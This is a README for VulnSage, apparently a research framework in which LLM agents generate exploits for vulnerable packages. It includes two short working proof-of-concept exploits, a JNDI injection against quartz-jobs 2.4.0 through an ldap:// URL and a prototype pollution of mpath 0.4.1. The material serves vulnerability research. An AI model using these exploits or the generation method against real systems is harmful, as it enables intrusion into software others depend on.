# Source Code of VulnSage

The artifact of **"A Multi-Agent Framework for Automated Exploit Generation with Constraint-Guided Comprehension and
Reflection"**, ICPC 2026.

> 🔍 **Note**: The internal white-box analysis engine is not open-sourced due to licensing restrictions.  
> However, VulnSage is **engine-agnostic**: you can integrate any static analyzer by converting its output to our
> standardized format.(see [Step 0](#step-0-preparing-white-box-analysis-reports-optional).
> For reproducibility, we include white-box analysis results for two demo cases:
> - Java: `org.quartz-scheduler:quartz-jobs:2.4.0` (JNDI injection) [
    `frontend/feeder/java_demo/org.quartz-scheduler:quartz-jobs:2.4.0_result.json`](frontend/feeder/java_demo/org.quartz-scheduler:quartz-jobs:2.4.0_result.json)
> - Node.js: `mpath@0.4.1` (prototype pollution) [
    `frontend/feeder/js_demo/mpath@0.4.1_result.json`](frontend/feeder/js_demo/mpath@0.4.1_result.json)

## 1. Structure

- `frontend/` — Source code of the five-agent orchestration system (Python).
- `server/` — Source code of the validation environment (Go).
- `cve-list.txt` — List of CVEs discovered by VulnSage that have been publicly disclosed.

## 2. Usage of VulnSage

### Step 0: Preparing White-Box Analysis Reports (Optional)

VulnSage consumes structured vulnerability candidate reports in a standardized JSON format.

To integrate your own white-box analysis tool, generate a report that conforms to the schema. Each entry must include:

- **`task_id`**: Unique identifier (e.g., `mpath@0.4.1_0`).
- **`package_name`**: Full package specifier (e.g., `mpath@0.4.1` or `org.quartz-scheduler:quartz-jobs:2.4.0`).
- **`install_module_mode`**: Installation mode (`"npm"` for Node.js, `"maven"` for Java, etc.).
- **`task_type`**: Vulnerability class (e.g., `prototypePollutionFunction`, `JNDIECR`).
- **`template`**: Invocation template with `<riskyArg>` or `<riskyName>` as attacker-controlled placeholders.
- **`code_check_list`**: Key code patterns (e.g., `require("mpath")`, `import org.quartz.jobs...`) used during runtime
  validation.
- **`trace`**: High-level data flow:
    - `user_input`: Attacker-controllable parameter.
    - `vulnerable_function`: Unsafe assignment sink.
    - `call_chain`: Function call sequence from entry point to sink.
- **`detailed_trace`**: Mapping from function names to actual source code snippets for precise reasoning.
- **`class_constructors`**: Constructor definitions for type-aware analysis.


### Step 1: Setting the Environment

#### **Requirements**

We assume you have Docker and Docker Compose installed.

```shell
$ lsb_release -a
Distributor ID: Ubuntu
Description:    Ubuntu 24.04.1 LTS
Release:        24.04
Codename:       noble

$ sudo docker --version
Docker version 27.5.1, build 27.5.1-0ubuntu3~24.04.2

$ sudo docker-compose --version
Docker Compose version v2.20.0
```

#### **Setup the API Key of Model Studio**

Obtain your Aliyun API key by following the instructions at:  
https://www.alibabacloud.com/help/en/model-studio/first-api-call-to-qwen  
The issued key follows the format `sk-axxxxxxxxxxxxxxx`.

Open `frontend/docker-compose.yaml` and replace the placeholder:

```yaml
environment:
  DASH_SCOPE_API_KEY: "sk-axxxxxxxxxxxxxxx"
```

Save the file and restart containers to apply the change.

#### **Build the Docker Network**

```shell
$ sudo docker network create backend
```

---

### Step 2: Setup VulnSage

#### **Start the VulnSage Frontend (Multi-Agent System)**

```shell
$ cd frontend
$ sudo docker-compose up -d --build
```

> The agent logic is implemented in Python 3.12 and located in `frontend/*`. You may also run it directly outside Docker
> if preferred.

#### **Start the VulnSage Server (Validation Environment)**

```shell
$ cd server
$ sudo docker-compose up -d --build
```

> The server is implemented in Go (1.24.0) and located in `server/go`. It builds an executable `vulnSageBackend` using
`go-bindata`.

#### **Check the Status**

```shell
$ sudo docker ps
ba1c949d3ff2   vulnsage-backend:latest       "./vulnSageBackend.sh"   ...                            server-app0-1
2df24361924e   vulnsage-frontend:latest      "bash -c 'tail -f /d…"   ...                            frontend-app0-1
```

---

### Step 3: Running VulnSage

We provide two demo cases:

- **Java**: `org.quartz-scheduler:quartz-jobs:2.4.0` — contains a JNDI injection vulnerability (based on real CVEs).
- **Node.js**: `mpath@0.4.1` — contains a prototype pollution vulnerability (from secBench.js).

#### Enter the Frontend Container

```shell
$ sudo docker exec -it frontend-app0-1 /bin/bash
```

#### Command Line Interface

```shell
uv run cli.py --help
2026-01-27 13:31:37.705 INFO configs --- VULN_SAGE_FRONTEND_ROOT_PATH: /app
2026-01-27 13:31:38.505 INFO prompting --- template_dir: /app/prompting/prompts
usage: cli.py [-h] [--json JSON] [--task_id TASK_ID] [--session_id SESSION_ID] [--remote_ip REMOTE_IP] [--language {nodejs,java}] [--output OUTPUT]

Run a single analysis task for either TypeScript/JavaScript or Java projects.

options:
  -h, --help            show this help message and exit
  --json JSON           Path to the JSON file containing scan feeder data. If provided and exists, it will be loaded to initialize the feeder. (default:
                        feeder/java_demo/org.quartz-scheduler:quartz-jobs:2.4.0_result.json)
  --task_id TASK_ID     Unique identifier of the task to analyze (e.g., 'package@version_index' for js or 'group:artifact:version' for java). (default: apidoc-core@0.15.0_0)
  --session_id SESSION_ID
                        Session id used to isolate runs/environments on the backend. Usually no need to change. (default: abc)
  --remote_ip REMOTE_IP
                        VulnSage backend base URL (e.g., http://127.0.0.1:58080). (default: http://127.0.0.1:58080)
  --language {nodejs,java}
                        Programming language of the project to analyze. Supported values: 'nodejs' (for TypeScript/JavaScript) or 'java' (for Java). (default: ts)
  --output OUTPUT       Path to the output file where the analysis result will be saved (in JSON format). (default: result.json)
```

#### Run the Java Demo

```shell
uv run cli.py \
  --output result.json \
  --json "/app/feeder/java_demo/org.quartz-scheduler:quartz-jobs:2.4.0_result.json" \
  --task_id org.quartz-scheduler:quartz-jobs:2.4.0_0 \
  --session_id abc \
  --remote_ip "http://server-app0-1:58080" \
  --language java
```

```shell
cat result.json
{
  "label": "Y",
  "taskId": "org.quartz-scheduler:quartz-jobs:2.4.0_0",
  "lastScriptCode": "package org.example;\nimport org.quartz.jobs.ee.jms.SendQueueMessageJob;\nimport org.quartz.impl.JobDetailImpl;\nimport org.quartz.impl.triggers.SimpleTriggerImpl;\nimport org.quartz.spi.TriggerFiredBundle;\nimport org.quartz.impl.JobExecutionContextImpl;\nimport org.quartz.JobDataMap;\n\npublic class App {\n    public static void main(String[] args) {\n        System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\");\n        JobDataMap jobDataMap = new JobDataMap();\n        jobDataMap.put(\"jms.connection.factory\", \"ldap://127.0.0.1:1099/Foo\");\n        \n        JobDetailImpl jobDetail = new JobDetailImpl();\n        jobDetail.setJobDataMap(jobDataMap);\n        \n        SimpleTriggerImpl trigger = new SimpleTriggerImpl();\n        \n        TriggerFiredBundle firedBundle = new TriggerFiredBundle(\n            jobDetail,\n            trigger,\n            null,\n            false,\n            null,\n            null,\n            null,\n            null\n        );\n        \n        SendQueueMessageJob instance = new SendQueueMessageJob();\n        JobExecutionContextImpl jobCtx = new JobExecutionContextImpl(\n            null,\n            firedBundle,\n            instance\n        );\n        \n        try {\n            instance.execute(jobCtx);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
  "reason": "The vulnerability exists as the PoC successfully executed and triggered the JNDI injection by passing a malicious LDAP URL through the JobDataMap to the SendQueueMessageJob.execute() method, resulting in the \"well done!\" confirmation message."
}
```

#### Run the Node.js Demo

```shell
uv run cli.py \
  --output result.json \
  --json "/app/feeder/js_demo/mpath@0.4.1_result.json" \
  --task_id mpath@0.4.1_0 \
  --session_id abc \
  --remote_ip "http://server-app0-1:58080" \
  --language nodejs
```

```shell
cat result.json
{
  "label": "Y",
  "taskId": "mpath@0.4.1_0",
  "lastScriptCode": "require(\"mpath\").set(\"constructor.prototype.polluted\", \"polluted\", {})\nconsole.log(({} as any).polluted !== undefined ? '[POLLUTION_TRIGGERED]' : '')",
  "reason": "The PoC successfully exploited the mpath.set function to pollute Object.prototype by using the path \"constructor.prototype.polluted\". This works because {}'s constructor is Object, and accessing constructor.prototype leads to Object.prototype, allowing property injection without directly accessing Object.prototype. The verification console.log confirmed the pollution was effective."
}
```